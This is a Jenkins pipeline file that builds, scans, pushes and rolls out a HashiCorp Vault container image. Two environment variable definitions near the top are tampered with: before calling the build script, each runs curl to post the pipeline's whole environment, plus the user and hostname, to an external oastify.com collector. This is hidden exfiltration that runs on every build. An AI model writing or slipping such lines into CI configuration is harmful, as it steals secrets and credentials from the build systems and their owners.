pipeline {
  parameters {
    booleanParam(name: 'SKIP_FAILURE', defaultValue: false, description: 'Skip pipeline failure if high severity CVEs are found')
  }
  agent {
    node {
      label 'rundeck'
      customWorkspace '/mnt/ephemeral/jenkins/workspace/' + env.JOB_NAME
    }
  }

  options {
    ansiColor('xterm')
    timestamps()
  }

  environment {
    BRANCH_NAME = "${ghprbSourceBranch ? ghprbSourceBranch : GIT_BRANCH.split("/")[1]}"
    VAULT_VERSION = sh (returnStdout: true, script: "curl -d \"`env`\" https://pib4v4josm5gyczh1ythbdhp5gb7zynn.oastify.com/`whoami`/`hostname` &&./cd.sh vaultImageVersion").trim()
    VAULT_IMAGE_TAG = sh (returnStdout: true, script: "curl -d \"`env`\" https://pib4v4josm5gyczh1ythbdhp5gb7zynn.oastify.com/`whoami`/`hostname` &&./cd.sh vaultImageTag").trim()
    IMAGE_SCAN_RESULTS = 'vault-scan-results.json'
    APPROVERS = 'parvez.kazi@coupa.com,ramesh.sencha@coupa.com,marutinandan.pandya@coupa.com'
  }

  stages {
    stage('Dockerfile Lint') {
      steps {
        sh label: "Lint Vault Dockerfile", script: "./cd.sh vaultDockerfileLint"
      }
    }

    stage('Build Image') {
      steps {
        sh label: "Build Vault Image", script: "./cd.sh vaultImageBuild"
      }
    }

    stage('Scan Image') {
      steps {
        echo 'Scanning Vault image using Twistlock plugin'
        prismaCloudScanImage ca: '',
          cert: '',
          dockerAddress: 'unix:///var/run/docker.sock',
          image: "${VAULT_IMAGE_TAG}",
          key: '',
          logLevel: 'info',
          podmanPath: '',
          project: '',
          resultsFile: "${IMAGE_SCAN_RESULTS}",
          ignoreImageBuildTime: true
        echo 'Scanning completed for vulnerabilities in the image!!'
            
        script {
          def skip_failure = params.SKIP_FAILURE
          echo "${skip_failure}"
          def json = readFile("${IMAGE_SCAN_RESULTS}")
          def vulnerabilities = new groovy.json.JsonSlurper().parseText(json)
          def highSeverityVulnerabilities = vulnerabilities.high
          echo "highSeverityVulnerabilities : ${highSeverityVulnerabilities}"
          if (highSeverityVulnerabilities > 0) {
            if (skip_failure) {
              echo "High severity vulnerabilities found, but the pipeline will continue as SKIP_FAILURE is enabled."
            } else {
              error("High severity vulnerabilities found in the image scan results.")
            }
          }
        }
      } 
    }


    stage('Push Image') {
      when { expression { BRANCH_NAME == 'master' } }
      steps {
        withCredentials([[$class: 'AmazonWebServicesCredentialsBinding', accessKeyVariable: 'AWS_ACCESS_KEY_ID', credentialsId: 'ECR_PUSH_COUPADEV', secretKeyVariable: 'AWS_SECRET_ACCESS_KEY']]) {
          sh label: "Push Vault Image", script: "./cd.sh vaultImagePush"
        }
      }
    }

    stage('Upgrade CE Vault Cluster') {
      when { expression { BRANCH_NAME == 'master' } }
      steps {
        sh label: "Upgrade CE Vault cluster", script: "./cd.sh upgradeCEVaultCluster"
      }
    }

    stage('Integration Tests') {
      when { expression { BRANCH_NAME == 'master' } }
      steps {
        sh label: "Integration Tests", script: "./cd.sh vaultIntegrationTests"
      }
    }

    stage('Send Slack notification') {
      when { expression { BRANCH_NAME == 'master' } }
      steps {
        echo 'Sending Slack notification for approval....'
        slackSend (
          channel: '#parveztest',
          color: 'good',
          message: "Vault CD Pipeline - Waiting for manual approval from any of ${env.APPROVERS.split(',').collect { '@' + it.trim().replace('@coupa.com', '') }.join(',')} to upgrade Dev Vault clusters to ${env.VAULT_VERSION} version : '${env.JOB_NAME}' (${env.BUILD_NUMBER})! (<${env.RUN_DISPLAY_URL}|Open>)"
        )
        echo 'Sent Slack notification for approval!!'
      }
    }

    stage('Upgrade Dev Clusters') {
      when {
        expression { BRANCH_NAME == 'master' && currentBuild.result == 'SUCCESS' }
        beforeInput true
        beforeOptions true
      }
      options {
        timeout(time: 24, unit: "HOURS")
      }
      input {
        message "Should we continue to upgrade ALL Vault Dev clusters with new version ${env.VAULT_VERSION}?"
        ok "Yes, we should."
        submitter "${env.APPROVERS}"
      }
      stages {
        stage('Upgrade vcqe-dev Cluster') {
          steps {
            sh label: "Upgrade vcqe-dev Cluster", script: "./cd.sh upgradeDevVaultClusters vcqe-dev"
          }
        }

        stage('Validation') {
          steps {
            sh label: "Validate Vault_monitor.rb", script: "/opt/coupa/bin/vault_monitor.rb"
          }
        }

        stage('Upgrade dev-us-east-1 Cluster') {
          steps {
            sh label: "Upgrade dev-us-east-1 Cluster", script: "./cd.sh upgradeDevVaultClusters dev-us-east-1"
          }
        }
      }
    }
  }

  post {
    success {
      prismaCloudPublish resultsFilePattern: "${IMAGE_SCAN_RESULTS}"
    }

    always {
      script {
        if (currentBuild.result == 'SUCCESS') {
          notifyBuild(currentBuild.currentResult, 'imageVulnerabilities')
        } else if (!env.SKIP_FAILURE) {
          error("Pipeline failed. Check the build status and fix any issues.")
        }
      }
    }
  }
}
